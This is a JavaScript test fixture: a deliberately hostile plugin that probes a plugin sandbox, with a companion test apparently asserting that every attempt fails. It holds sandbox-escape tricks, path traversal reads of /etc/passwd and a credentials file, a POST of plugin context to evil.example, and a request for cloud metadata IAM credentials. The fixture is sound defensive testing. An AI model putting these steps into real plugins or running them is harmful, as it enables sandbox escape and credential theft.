/**
 * Deliberately hostile plugin fixture. Declares every permission the runtime
 * has (and no networkHosts, so the network is granted with an empty
 * allowlist) and spends its run trying to break out: sandbox globals, host
 * bridge, scoped fs, the store and the network.
 *
 * Every step is console-logged with a [MALICIOUS] prefix, so a run that
 * escapes is unmistakable in the engine log. test/malicious-plugin.test.ts
 * asserts that every attempt fails. Never ships with an app.
 */

const checks = {};

function attack(name, fn) {
  console.log("[MALICIOUS] attempt " + name);
  try {
    const value = fn();
    const shown = value === undefined ? "undefined" : String(value).slice(0, 160);
    checks[name] = { ok: true, value: shown };
    console.log("[MALICIOUS] " + name + " -> ALLOWED: " + shown);
  } catch (e) {
    const msg = String((e && e.message) || e).slice(0, 200);
    checks[name] = { ok: false, error: msg };
    console.log("[MALICIOUS] " + name + " -> blocked: " + msg.slice(0, 100));
  }
}

function probe(name, fn) {
  try {
    const shown = String(fn()).slice(0, 200);
    checks[name] = { ok: true, value: shown };
    console.log("[MALICIOUS] " + name + " -> ALLOWED: " + shown);
  } catch (e) {
    const msg = String((e && e.message) || e).slice(0, 200);
    checks[name] = { ok: false, error: msg };
    console.log("[MALICIOUS] " + name + " -> blocked: " + msg.slice(0, 120));
  }
}

/** Separate export so the async module loader gets its own pass. */
export async function probeDynamic() {
  console.log("[MALICIOUS] attempt dynamic-import node:fs");
  try {
    const mod = await import("node:fs");
    try {
      const leaked = mod.readFileSync("/etc/passwd", "utf8").slice(0, 40);
      console.log("[MALICIOUS] dynamic-import -> ALLOWED (host fs read!)");
      return { ok: true, leaked };
    } catch (e) {
      const msg = "imported but fs locked: " + String((e && e.message) || e);
      console.log("[MALICIOUS] dynamic-import -> blocked: " + msg.slice(0, 140));
      return { ok: false, error: msg };
    }
  } catch (e) {
    const msg = String((e && e.message) || e);
    console.log("[MALICIOUS] dynamic-import -> blocked: " + msg.slice(0, 140));
    return { ok: false, error: msg };
  }
}

export function uiPanel(ctx, host) {
  // pass 2: the host ran the queued network attempts; record its verdicts
  if (ctx && ctx.__report) {
    const report = ctx.__report;
    const nets = host.net.results || {};
    for (const key of ["exfil", "metadata", "file"]) {
      const r = nets[key] || { ok: false, error: "no result" };
      report["net-" + key] = { ok: r.ok === true, error: r.error || null, status: r.status || null };
      console.log("[MALICIOUS] net-" + key + " -> " + (r.ok ? "ALLOWED" : "blocked: " + String(r.error)));
    }
    report.done = true;
    return { __report: report };
  }

  console.log("[MALICIOUS] ---- hostile run starts; host bridge: " + Object.keys(host).join(","));

  // what the guest can even see
  checks.globals = {
    process: typeof process,
    require: typeof require,
    fetch: typeof fetch,
    WebSocket: typeof WebSocket,
    XMLHttpRequest: typeof XMLHttpRequest,
    importScripts: typeof importScripts,
    Buffer: typeof Buffer,
    navigator: typeof navigator,
  };
  if (typeof process !== "undefined") {
    probe("process-keys", function () { return Object.keys(process).join(","); });
    probe("process-env", function () { return process.env ? "env keys: " + Object.keys(process.env).join(",") : String(process.env); });
    probe("process-exit", function () { process.exit(0); return "exited"; });
    probe("process-cwd", function () { return String(process.cwd()); });
    probe("process-binding", function () { return String(typeof process.binding); });
    probe("process-mainModule", function () { return String(typeof process.mainModule); });
  }
  console.log("[MALICIOUS] globals " + JSON.stringify(checks.globals));

  attack("constructor-escape", function () {
    return globalThis.constructor.constructor("return typeof process")();
  });
  attack("prototype-pollute", function () {
    Object.prototype.pwned = "yes";
    return ({}).pwned;
  });

  attack("fs-read-abs", function () { return host.fs.read("/etc/passwd"); });
  attack("fs-read-traversal", function () { return host.fs.read("../../etc/passwd"); });
  attack("fs-read-credentials", function () { return host.fs.read("../../../../credentials/admin/auth.json"); });
  attack("fs-list-outside", function () { return host.fs.list("..").join(","); });
  attack("fs-read-symlink", function () { return host.fs.read("passwd-link"); });
  attack("fs-write-symlink", function () { host.fs.write("dangling", "owned"); return "wrote"; });
  attack("fs-write-outside", function () { host.fs.write("../pwned.txt", "owned"); return "wrote"; });
  attack("fs-write-inside", function () { host.fs.write("inside.txt", "hello"); return host.fs.read("inside.txt"); });

  attack("store-foreign-read", function () {
    return "keys=" + host.store.keys().join(",") + " victim-secret=" + String(host.store.get("victim-secret"));
  });
  attack("store-flood", function () {
    for (let i = 0; i < 12; i++) host.store.put("flood-" + i, "x".repeat(200000));
    return "wrote everything";
  });

  attack("zip-without-payload", function () { return JSON.stringify(host.zip.entries()).slice(0, 40); });

  attack("net-malformed", function () { host.net.request("bad", {}); return "queued"; });
  host.net.request("file", { url: "file:///etc/passwd" });
  host.net.request("exfil", { url: "https://evil.example/collect", method: "POST", body: JSON.stringify(ctx) });
  host.net.request("metadata", { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" });
  console.log("[MALICIOUS] net requests queued; waiting for the host verdict");

  checks.netPending = { ok: true, value: "queued" };
  return { __report: { checks: checks } };
}
